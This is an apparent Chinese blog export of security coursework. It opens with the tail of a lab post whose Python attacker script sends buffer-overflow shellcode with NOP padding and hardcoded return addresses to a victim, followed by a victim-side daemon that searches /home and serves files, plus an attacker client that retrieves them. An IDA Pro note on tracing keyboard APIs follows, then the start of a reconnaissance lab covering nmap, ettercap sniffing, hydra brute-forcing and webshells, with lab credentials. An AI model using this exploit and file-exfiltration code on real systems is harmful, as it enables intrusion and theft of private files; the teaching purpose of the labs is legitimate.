class="line"><span class="function"><span class="keyword">def</span> <span class="title">tans</span><span class="params">(clientsocket)</span>:</span></span><br><span class="line">    print(<span class="string">"connect success"</span>)</span><br><span class="line">    print(<span class="string">"attack_mode：【1】创建txt文件 【2】发送daemon程序 【3】执行daemon文件 【其他】正常沟通（输入quit退出））"</span>)</span><br><span class="line">    attack_mode = input(<span class="string">"请输入attack_mode:"</span>)</span><br><span class="line">    <span class="keyword">if</span> attack_mode == <span class="string">"1"</span>:  <span class="comment"># 【1】创建txt文件</span></span><br><span class="line">        print(<span class="string">"创建txt文件shellcode发送"</span>)</span><br><span class="line">        <span class="comment">#拼接shellcode</span></span><br><span class="line">        clientsocket.send(payload_new(<span class="string">"1"</span>))  <span class="comment"># 这里要发生字节流形式，记住这个形式就可以了</span></span><br><span class="line">        print(<span class="string">"创建txt文件shellcode发送结束"</span>)</span><br><span class="line">    <span class="keyword">elif</span> attack_mode == <span class="string">"2"</span>:  <span class="comment"># 【2】发送daemon程序</span></span><br><span class="line">        print(<span class="string">"发送daemon程序shellcode发送"</span>)</span><br><span class="line">        payload_new(shellcode_daemon) <span class="comment">#拼接shellcode</span></span><br><span class="line">        clientsocket.send(payload_new(<span class="string">"2"</span>))  <span class="comment"># 这里要发生字节流形式，记住这个形式就可以了</span></span><br><span class="line">        data = clientsocket.recv(<span class="number">1024</span>)</span><br><span class="line">        print(<span class="string">"发送daemon程序shellcode发送结束"</span>)</span><br><span class="line">    <span class="keyword">elif</span> attack_mode == <span class="string">"3"</span>:  <span class="comment"># 【3】执行daemon文件</span></span><br><span class="line">        print(<span class="string">"执行daemon文件shellcode发送"</span>)</span><br><span class="line">        payload_new(shellcode_execdaemon) <span class="comment">#拼接shellcode</span></span><br><span class="line">        clientsocket.send(payload_new(<span class="string">"3"</span>))  <span class="comment"># 这里要发生字节流形式，记住这个形式就可以了</span></span><br><span class="line">        print(<span class="string">"执行daemon文件shellcode发送结束"</span>)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># 【其他】正常沟通</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">            input_data = input(<span class="string">"send:"</span>)</span><br><span class="line">            <span class="keyword">if</span> input_data==<span class="string">"quit"</span>:</span><br><span class="line">                input_data = <span class="string">b"\x90"</span> * (<span class="number">120</span>)</span><br><span class="line">                clientsocket.send(input_data)   <span class="comment"># 使服务器异常退出停止socket，可用于中止服务器</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            clientsocket.send(input_data.encode(<span class="string">"utf-8"</span>))  <span class="comment"># 这里要发生字节流形式，记住这个形式就可以了</span></span><br><span class="line">            data = clientsocket.recv(<span class="number">1024</span>)</span><br><span class="line">            print(<span class="string">"recv:"</span>, data)</span><br><span class="line"><span class="comment">#用于拼接字符串</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload_new</span><span class="params">(shellcode_mode)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> shellcode_mode==<span class="string">"2"</span>:</span><br><span class="line">        payload = shellcode_daemon + <span class="string">b"\x90"</span> * (<span class="number">108</span> - len(shellcode_daemon))</span><br><span class="line">    <span class="keyword">elif</span> shellcode_mode==<span class="string">"3"</span>:</span><br><span class="line">        payload = shellcode_execdaemon + <span class="string">b"\x90"</span> * (<span class="number">108</span> - len(shellcode_execdaemon))</span><br><span class="line">        print(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = shellcode_createtxt + <span class="string">b"\x90"</span> * (<span class="number">108</span> - len(shellcode_createtxt))</span><br><span class="line">    payload = payload + <span class="string">b'\xcc\xde\xff\xbf\xdc\xde\xff\xbf'</span></span><br><span class="line">    payload = payload + <span class="string">b'\x00'</span></span><br><span class="line">    print(<span class="string">"拼接payload成功"</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">print(<span class="string">"正在扫描..., 请稍等..."</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动程序入口</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># 启动扫描程序</span></span><br><span class="line">    <span class="comment"># ports=input("输入想要扫描的端口")</span></span><br><span class="line">    <span class="comment"># port_list = port_list.append(ports.split(' '))</span></span><br><span class="line">    <span class="comment"># print(port_list)</span></span><br><span class="line">    <span class="comment"># search_routers()</span></span><br><span class="line">    comm_or_attack()</span><br></pre></td></tr></table></figure>

<h2 id="6-3-daemon服务端（受害方）程序-daemonl-py"><a href="#6-3-daemon服务端（受害方）程序-daemonl-py" class="headerlink" title="6.3 daemon服务端（受害方）程序 daemonl.py"></a>6.3 daemon服务端（受害方）程序 daemonl.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment">#公钥和公钥摘要不一致，密钥被篡改！</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthenticationError</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, Errorinfo)</span>:</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        self.errorinfo = Errorinfo</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.errorinfo</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Server</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 默认的最大等待数量为5</span></span><br><span class="line">    <span class="comment"># 默认使用本机的ip地址和8080端口</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, backlog=<span class="number">5</span>, addr=<span class="params">(<span class="string">"192.168.30.133"</span>, <span class="number">8080</span>)</span>)</span>:</span></span><br><span class="line">        <span class="comment"># 默认使用AF_INET协议族，即ipv4地址和端口号的组合以及tcp协议</span></span><br><span class="line">        self.serverSocket = socket.socket()</span><br><span class="line">        <span class="comment"># 绑定监听的ip地址和端口号</span></span><br><span class="line">        self.serverSocket.bind(addr)</span><br><span class="line">        <span class="comment"># 开始等待</span></span><br><span class="line">        self.serverSocket.listen(backlog)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 该函数需要并行处理</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">link_one_client</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 获取客户端对象和客户端地址</span></span><br><span class="line">        clientSocket, addr = self.serverSocket.accept()</span><br><span class="line">        <span class="comment"># 打印</span></span><br><span class="line">        print(<span class="string">"和客户端建立连接\n目标主机地址为：&#123;0&#125;"</span>.format(addr))</span><br><span class="line">        <span class="comment"># 接受客户端传递的公钥</span></span><br><span class="line">        <span class="comment"># 这里可以加一个哈希函数检验公钥的正确性！</span></span><br><span class="line">        <span class="comment"># 运用pickle进行反序列化</span></span><br><span class="line">        publicKeyPK, pubKeySha256 = pickle.loads(clientSocket.recv(<span class="number">1024</span>))</span><br><span class="line">        <span class="keyword">if</span> hashlib.sha256(publicKeyPK).hexdigest() != pubKeySha256:</span><br><span class="line">            <span class="keyword">raise</span> AuthenticationError(<span class="string">"公钥被篡改！"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            publicKey = pickle.loads(publicKeyPK)</span><br><span class="line">            print(<span class="string">"已接受公钥"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 下面是用公钥加密对称密钥并传递的过程</span></span><br><span class="line">        <span class="comment"># 产生用于 AES 对称加密的密钥</span></span><br><span class="line">        sym_key = Fernet.generate_key()</span><br><span class="line">        <span class="comment"># 用pickle进行序列化用来进行网络传输</span></span><br><span class="line">        <span class="comment"># 对密钥进行hash保证其准确性</span></span><br><span class="line">        en_sym_key = rsa.encrypt(pickle.dumps(sym_key), publicKey)</span><br><span class="line">        en_sym_key_sha256 = hashlib.sha256(en_sym_key).hexdigest()</span><br><span class="line">        print(<span class="string">"正在加密传送AES对称密钥"</span>) <span class="comment">#发送AES密钥以及AES密钥的摘要</span></span><br><span class="line">        clientSocket.send(pickle.dumps((en_sym_key,en_sym_key_sha256)))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 这里可以添加密钥交换成功的函数</span></span><br><span class="line">        print(<span class="string">"密钥交换结束"</span>)</span><br><span class="line">        <span class="comment"># 从AES的密钥初始化加密对象</span></span><br><span class="line">        AES = Fernet(sym_key)</span><br><span class="line">        <span class="comment"># 下面使用对称密钥进行加密对话的过程</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            <span class="comment"># 接收到的加密消息</span></span><br><span class="line">            recvData = clientSocket.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># ============接收解密=================</span></span><br><span class="line">            <span class="comment"># recvData = AES.decrypt(recvData).decode()  #====接收解密</span></span><br><span class="line">            <span class="comment"># ================不解密=================</span></span><br><span class="line">            recvData = recvData.decode()</span><br><span class="line"></span><br><span class="line">            print(<span class="string">"接受到客户端传来的消息：&#123;0&#125;"</span>.format(recvData))</span><br><span class="line">            sendData = get_reply(recvData)<span class="comment">#调用回复函数来判断</span></span><br><span class="line">            <span class="comment"># 对消息进行加密</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># ============加密发送=================</span></span><br><span class="line">            <span class="comment"># sendData = AES.encrypt(sendData.encode())</span></span><br><span class="line">            <span class="comment"># clientSocket.send(sendData)</span></span><br><span class="line">            <span class="comment"># ===============不加密=================</span></span><br><span class="line">            clientSocket.send(sendData.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># route=["/home/lfl/桌面/Socket_Example-master/lesson03_trans_file/lfl.txt"] #路径列表，我们用第一个</span></span><br><span class="line">routes=[]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_reply</span><span class="params">(recvData)</span>:</span></span><br><span class="line">    recvData=json.loads(recvData)</span><br><span class="line">    <span class="comment"># print(recvData["A"])</span></span><br><span class="line">    <span class="keyword">if</span> recvData[<span class="string">"Method"</span>]==<span class="string">"get_file"</span>:</span><br><span class="line">        print(recvData[<span class="string">"file_name"</span>])</span><br><span class="line">        search(os.path.abspath(<span class="string">'/home'</span>), recvData[<span class="string">"file_name"</span>])</span><br><span class="line">        <span class="comment"># print(route[0])</span></span><br><span class="line">        print(routes)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&#123;\"content\":\""</span>+open(routes[<span class="number">0</span>]).read().replace(<span class="string">'\n'</span>, <span class="string">''</span>).replace(<span class="string">'\r'</span>, <span class="string">''</span>)+<span class="string">"\"&#125;"</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment">#不是get_file</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&#123;\"content\":\"hello\"&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#搜索文件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(curpath, s)</span>:</span></span><br><span class="line">    L = os.listdir(curpath)  <span class="comment">#列出当前目录下所有文件</span></span><br><span class="line">    <span class="keyword">for</span> subpath <span class="keyword">in</span> L:  <span class="comment">#遍历当前目录所有文件</span></span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(os.path.join(curpath, subpath)):  <span class="comment">#若文件仍为目录，递归查找子目录</span></span><br><span class="line">            newpath = os.path.join(curpath, subpath)</span><br><span class="line">            search(newpath, s)</span><br><span class="line">        <span class="keyword">elif</span> os.path.isfile(os.path.join(curpath, subpath)):  <span class="comment">#若为文件，判断是否包含搜索字串</span></span><br><span class="line">            <span class="keyword">if</span> s <span class="keyword">in</span> subpath:</span><br><span class="line">                routes.append(os.path.join(curpath, subpath))</span><br><span class="line">                <span class="comment">#print(routes)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#main函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">"dameon开始运行！"</span>)</span><br><span class="line">    server = Server()</span><br><span class="line">    server.link_one_client()</span><br></pre></td></tr></table></figure>

<h2 id="6-4-daemon客户端（攻击方）程序-client-py"><a href="#6-4-daemon客户端（攻击方）程序-client-py" class="headerlink" title="6.4 daemon客户端（攻击方）程序 client.py"></a>6.4 daemon客户端（攻击方）程序 client.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment">#公钥和公钥摘要不一致，密钥被篡改！</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthenticationError</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, Errorinfo)</span>:</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        self.errorinfo = Errorinfo</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.errorinfo</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Client</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 产生rsa非对称密钥</span></span><br><span class="line">        self.rsaKey = rsa.newkeys(<span class="number">2048</span>)</span><br><span class="line">        <span class="comment"># 产生rsa公钥和私钥</span></span><br><span class="line">        self.publicKey = self.rsaKey[<span class="number">0</span>]</span><br><span class="line">        self.privateKey = self.rsaKey[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">link_server</span><span class="params">(self, ip,port )</span>:</span></span><br><span class="line">        addr = (ip, port)</span><br><span class="line">        <span class="comment"># 创建socket通信对象</span></span><br><span class="line">        <span class="comment"># 默认使用AF_INET协议族，即ipv4地址和端口号的组合以及tcp协议</span></span><br><span class="line">        clientSocket = socket.socket()</span><br><span class="line">        <span class="comment"># 默认连接服务器地址为本机ip和8080端口</span></span><br><span class="line">        clientSocket.connect(addr)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 向服务器传递公钥，和该公钥字符串化后的sha256值</span></span><br><span class="line">        <span class="comment"># 发送的sha256用于校验公钥是否正确</span></span><br><span class="line">        print(<span class="string">"正在向服务器传送 RSA 公钥"</span>)</span><br><span class="line">        sendKey = pickle.dumps(self.publicKey)</span><br><span class="line">        sendKeySha256 = hashlib.sha256(sendKey).hexdigest()</span><br><span class="line">        clientSocket.send(pickle.dumps((sendKey, sendKeySha256)))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 接受服务器传递的密钥并进行解密</span></span><br><span class="line">        symKey, symKeySha256 = pickle.loads(clientSocket.recv(<span class="number">1024</span>))</span><br><span class="line">        <span class="keyword">if</span> hashlib.sha256(symKey).hexdigest() != symKeySha256:</span><br><span class="line">            <span class="keyword">raise</span> AuthenticationError(<span class="string">"AES密钥被篡改！"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.symKey = pickle.loads(rsa.decrypt(symKey, self.privateKey))</span><br><span class="line">            print(<span class="string">"AES密钥交换完成"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 从AES的密钥初始化加密对象</span></span><br><span class="line">        AES = Fernet(self.symKey)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            file_name = input(<span class="string">"输入你想获得的文件："</span>)</span><br><span class="line">            sendData =<span class="string">"&#123;\"Method\":\"get_file\",\"file_name\": \""</span>+file_name+<span class="string">"\"&#125;"</span></span><br><span class="line">            print(sendData)</span><br><span class="line">            <span class="comment"># ============加密发送=================</span></span><br><span class="line">            <span class="comment"># sendData = AES.encrypt(sendData.encode())</span></span><br><span class="line">            <span class="comment"># clientSocket.send(sendData)</span></span><br><span class="line">            <span class="comment"># ===============不加密=================</span></span><br><span class="line">            clientSocket.send(sendData.encode())</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 接收数据</span></span><br><span class="line">            recvData = clientSocket.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="comment"># ============接收解密=================</span></span><br><span class="line">            <span class="comment"># recvData = AES.decrypt(recvData).decode()</span></span><br><span class="line">            <span class="comment"># ================不解密=================</span></span><br><span class="line">            recvData = recvData.decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            print(<span class="string">"接收到加密的文件数据,保存文件"</span>)</span><br><span class="line">            print(recvData)</span><br><span class="line">            recvData = json.loads(recvData) <span class="comment">#加载文件内容为json</span></span><br><span class="line">            file = open(file_name, <span class="string">'a'</span>)  <span class="comment"># 若文件不存在，系统自动创建'a'表示可连续写入到文件，保留原内容，在原内容之后写入，可修改该模式（'w+','w','wb'等）</span></span><br><span class="line">            file.write(recvData[<span class="string">"content"</span>])  <span class="comment"># 将字符串写入文件中</span></span><br><span class="line">            file.close()</span><br><span class="line">            print(<span class="string">"接受到服务器传来的消息：&#123;0&#125;"</span>.format(recvData))</span><br><span class="line"><span class="comment">#main函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">"欢迎使用客户端程序！"</span>)</span><br><span class="line">    client = Client()</span><br><span class="line">    client.link_server(<span class="string">"192.168.30.133"</span>,<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>实验</category>
      </categories>
      <tags>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title>IDA pro的使用总结</title>
    <url>/2020/06/13/2020-06-13-ida-usage/</url>
    <content><![CDATA[<p>目前知道的快捷键：</p>
<ul>
<li>双击某个函数进入其中</li>
<li>双击进入某个函数后，按ESC返回上一级函数</li>
<li>在返回上一级函数后，按CTRL+ENTER进入之前的下一级函数</li>
<li>在汇编界面按 <code>;</code>进行注释，在C语言界面按<code>/</code>进行注释</li>
<li>在注释完之后按CTRL+ENTER确定注释，手点确定确实累</li>
<li>在graph视图模式按F5从汇编切换到C语言</li>
<li>在graph视图模式，当光标在某个函数框里时，按空格键切换汇编和graph视图</li>
<li>右键左边function视图可以看到Edit function 可以修改颜色，标记自己发现的比较重要的函数。（也可以在graph的代码界面右键进行颜色标记）</li>
</ul>
<p>几个重要的视图：</p>
<ul>
<li>被引用、和引用的网络图，这个在主视图-graph视图-右键菜单的倒数几项里</li>
<li>然后就是Proximity browser视图，这个很好用，直接把每个功能模块抽象成一个函数名（有的函数名仍是stu_xxxx），而且点击某个函数可以进入，点击当前的顶层函数名，还可以找到调用他的链接。</li>
<li>然后是左边的function视图，可以ctrl+F搜索某个函数，有些都是stu、有些是引入的，这个也很重要，用来进入键盘、文件函数的内部，然后在Proximity browser视图逐级往上找调用它的函数。</li>
</ul>
<p>现在知道的逆向思路（学习参考qhy做法）</p>
<ul>
<li><p>对于键盘来说</p>
<ul>
<li><p>在Import导入函数视图中，按CTRL+F，搜索框搜索<code>key</code>这个关键字。可以看到相关的引入函数</p>
</li>
<li><p>现在已知的关键函数有：</p>
<ul>
<li><p><code>SHORT GetAsyncKeyState(int vKey);</code><strong>直接侦测键盘的硬件中断</strong>，返回key status. 然后判断返回值的最高位是不是1，如果是表示这个处于按下状态</p>
</li>
<li><p><code>SHORT GetKeyState(  int nVirtKey );</code> 从windows消息队列中取得键盘消息，返回key status.</p>
<p>nVrtKey：定义一虚拟键。若要求的虚拟键是字母或数字（A～Z，a～z或0～9），nVirtKey必须被置为相应字符的ASCII码值，对于其他的键，nVirtKey必须是一虚拟键码。</p>
<p>GetKeyState函数是用来<strong>获取指定的虚拟键码的按键的状态</strong>。返回码的高位显示当前是否有键被按下，低位（0位）则显示NumLock、CapsLock、ScrollLock的状态（ON或OFF，为ON时键盘指示灯亮）。即高位为1，返回值小于0，说明有键按下</p>
</li>
</ul>
</li>
<li><p>然后<strong>在function视图中搜索GetKeyState这个函数</strong>，可以看到一些函数块，点击进去，在主页面可以看到点击出来的函数块，<strong>开启Proximity browser视图</strong>，然后就可以级往上找调用它的函数。</p>
</li>
<li><p>然后看到可能是比较重要的，可以切换到graph的汇编视图来，或者F5的C语言视图来查看代码进行分析。</p>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>网安平台实验1</title>
    <url>/2020/05/23/2020-03-16-Network-Security-Experiment-1/</url>
    <content><![CDATA[<h1 id="1-1-网络侦察实验"><a href="#1-1-网络侦察实验" class="headerlink" title="1.1 网络侦察实验"></a>1.1 网络侦察实验</h1><p><strong>1.【【实验描述】】</strong></p>
<p>随着时代的发展和网络的普及，在世界各国、各层次的计算机网络中，储存着大量公开资料和机密资料，由于网络漏洞的存在，为“黑客”入侵计算机网络系统获取机密资料提供了很多便利，这些资料引起了各国军事情报部门的重视，都大力开展利用计算机网络系统来获取情报资料的研究和尝试，这便是网络侦察。</p>
<p>网络侦查是指黑客为了更加有效地实施攻击而在攻击前或攻击过程中对目标主机的所有探测活动。网络侦查有时也被称为“踩点”。通常“踩点”包括以下内容：目标主机的域名、IP地址、操作系统类型、开放了哪些端口，以及这些端口后面运行着什么样的应用程序，这些应用程序有没有漏洞等。那么如何收集信息呢？可以利用与技术无关的“社会工程学”、搜索引擎以及扫描工具。</p>
<p>本实验旨在通过在企业复杂网络场景下的网络侦查应用实战，让学生深刻理解网络侦查的概念、特性和原理，掌握网络侦查相关技术，具备对网络进行侦查、渗透、敏感信息获取以及防网络侦查的技术能力，这对于学生的信息安全技术能力提升、国家网络空间安全战略实施，都有非常重要的意义。</p>
<p>本实验内容共包含4个子任务，分别是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">任务一 使用nmap、ettercap进行网络侦查和密码嗅探；</span><br><span class="line">任务二 使用crunch、hydra暴力破解ssh服务登陆密码；</span><br><span class="line">任务三 使用ssh登录目标机，获得敏感信息；</span><br><span class="line">任务四 获取目标网站的webshell权限，控制目标机，获得敏感信息。</span><br></pre></td></tr></table></figure>

<p><strong>2实验目的</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.了解网络侦查、信息收集、漏洞挖掘和利用的基本概念以及常用的信息收集和安全漏洞扫描工具，认知常见的网络侦查手段和企业网络安全漏洞。</span><br><span class="line">2.掌握nmap工具的功能和操作方法，并能够分析检侧结果，能够运用这些工具解决目标网络信息探测、漏洞挖掘等常见的安全问题。</span><br><span class="line">3.了解ettercap嗅探工具的基本功能，掌握常见的嗅探相关服务和应用的用户名和密码的方法。</span><br><span class="line">4.了解crunch的基本功能，掌握利用crunch生成密码字典文件的方法。</span><br><span class="line">5.了解hydra密码爆破工具的基本功能和使用方法，掌握常见的爆破服务和应用的用户名和密码的方法。 </span><br><span class="line">6.熟悉网站wenshell的概念，理解上传webshell、获取webshell权限的意义和方法，掌握获取webshell权限基础上控制目标机的方法。</span><br></pre></td></tr></table></figure>

<p>通过nmap、ettercap、crunch和hydra等工具的学习和使用，能够融会贯通，掌握相关服务如ftp、web等漏洞挖掘、渗透、攻击和利用的原理和方法，掌握自主学习和实践主流企业网络扫描工具的功能、操作技巧、检测结果分析、网络侦查、漏洞挖掘的常用方法，具备企业复杂网络信息安全管理的职业能力和终身学习能力。</p>
<p><strong>3实验工具</strong></p>
<ul>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:nmap" target="_blank" rel="noopener">Nmap</a>（集成于kali linux）</li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:ettercap" target="_blank" rel="noopener">ettercap</a>（集成于kali linux）</li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:crunch" target="_blank" rel="noopener">crunch</a>（集成于kali linux）</li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:hydra" target="_blank" rel="noopener">hydra</a>（集成于kali linux）</li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:firefox" target="_blank" rel="noopener">Firefox</a>（54.2.0）</li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:rdesktop" target="_blank" rel="noopener">Rdesktop</a></li>
</ul>
<p><strong>4实验环境</strong></p>
<table>
<thead>
<tr>
<th>操作系统</th>
<th>IP地址</th>
<th>服务器角色</th>
<th>登录账户密码</th>
</tr>
</thead>
<tbody><tr>
<td>kali Linux</td>
<td>192.168.1.2</td>
<td>操作机</td>
<td>用户名：root；密码：Simplexue123</td>
</tr>
<tr>
<td>Ubuntu12</td>
<td>192.168.1.3</td>
<td>目标机</td>
<td>用户名：root；密码：Simplexue123</td>
</tr>
<tr>
<td>Windows2012</td>
<td>192.168.1.4</td>
<td>目标机</td>
<td>用户名：administrator；密码：Simplexue123</td>
</tr>
</tbody></table>
<p>实验拓扑图如下</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200316171551313.png" alt="image-20200316171551313"></p>
<h2 id="任务1-使用nmap、ettercap进行网络侦查和密码嗅探"><a href="#任务1-使用nmap、ettercap进行网络侦查和密码嗅探" class="headerlink" title="任务1-使用nmap、ettercap进行网络侦查和密码嗅探"></a>任务1-使用nmap、ettercap进行网络侦查和密码嗅探</h2><h3 id="【实验描述】"><a href="#【实验描述】" class="headerlink" title="【实验描述】"></a>【实验描述】</h3><p>本实验任务基于真实企业网络环境，在三台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用kali集成的扫描工具nmap，对网络进行探测，收集目标网络存活的主机信息，收集主机开放的服务信息。</span><br><span class="line">利用kali集成的嗅探工具ettercap，对FTP服务进行嗅探，获取目标主机的ftp登录密码（提交嗅探到的ftp登录密码）。</span><br></pre></td></tr></table></figure>

<p>通过完成本实验任务，要求学生掌握利用nmap进行网络探测并获取目标主机开放的服务等关键信息的方法；掌握通过ettercap实现对目标主机的服务如ftp进行嗅探的流程、方法和技巧，为完成后续网络侦查和漏洞利用实验任务奠定坚实的网络探测技术基础。</p>
<h3 id="【实验目标】"><a href="#【实验目标】" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">了解网络侦查、信息收集、漏洞挖掘和利用的基本概念以及常用的信息收集和安全漏洞扫描工具，认知常见的网络侦查手段和企业网络安全漏洞。</span><br><span class="line">掌握nmap工具的功能和操作方法，并能够分析检侧结果，能够运用这些工具解决目标网络信息探测、漏洞挖掘等常见的安全问题。</span><br><span class="line">了解ettercap嗅探工具的基本功能，掌握常见的嗅探相关服务和应用的用户名和密码的方法。</span><br></pre></td></tr></table></figure>

<p>通过nmap、ettercap等工具的学习和使用，能够举一反三，掌握自主学习企业级网络扫描工具功能、操作技巧、检测结果分析、网络侦查、漏洞挖掘的常用方法，最终具备企业复杂网络侦查、漏洞挖掘和信息系统安全管理的职业能力。</p>
<h3 id="【实验工具】"><a href="#【实验工具】" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><ul>
<li><a href="[http://210.42.123.2:8088/doku.php?id=%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%91%BD%E4%BB%A4%E4%B8%8E%E5%B7%A5%E5%85%B7:nmap](http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:nmap)">nmap</a>（集成于kali linux）</li>
<li><a href="[http://210.42.123.2:8088/doku.php?id=%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%91%BD%E4%BB%A4%E4%B8%8E%E5%B7%A5%E5%85%B7:ettercap](http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:ettercap)">ettercap</a>（集成于kali linux）</li>
</ul>
<h3 id="【实验步骤】"><a href="#【实验步骤】" class="headerlink" title="【实验步骤】"></a>【实验步骤】</h3><p>1.</p>
<p>在Kali linux操作系统中打开操作终端，并使用nmap命令扫描192.168.1.0网段的存活主机，并探测该网段存活主机的开放端口、服务、操作系统及版本信息。</p>
<blockquote>
<p>可以使用Kali linux集成的nmap工具来完成【操作步骤】1.1，也可以通过操作机自行上传其他工具来完成。</p>
</blockquote>
<p><strong>使用Nmap实现网段内的IP发现：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP ip/mask</span><br><span class="line">nmap -sP 192.168.1.0/24</span><br></pre></td></tr></table></figure>

<p>可以看到当前网段存活的IP有192.168.1.2\3\4</p>
